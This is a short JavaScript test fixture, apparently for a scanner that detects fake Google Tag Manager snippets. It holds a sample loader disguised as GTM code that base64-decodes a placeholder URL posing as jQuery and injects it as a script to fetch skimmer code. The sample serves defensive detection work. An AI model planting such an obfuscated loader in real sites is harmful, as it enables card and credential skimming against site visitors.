// expect: fake-gtm-loader
// Modeled on Confiant (2026) and Sucuri (2025): a block dressed up as the Google Tag Manager snippet
// whose real job is to decode and load a skimmer URL. The genuine snippet never calls atob().
(function (w, d, s, l, i) {
  w[l] = w[l] || []; w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' });
  var r = d.createElement(s); r.async = true;
  r.src = w.atob('aHR0cHM6Ly9zdGF0aWMtY2RuLmV4YW1wbGUvanMvanF1ZXJ5Lm1pbi5qcw==');
  d.getElementsByTagName(s)[0].parentNode.insertBefore(r, d.getElementsByTagName(s)[0]);
})(window, document, 'script', 'dataLayer', 'GTM-EXAMPL3');
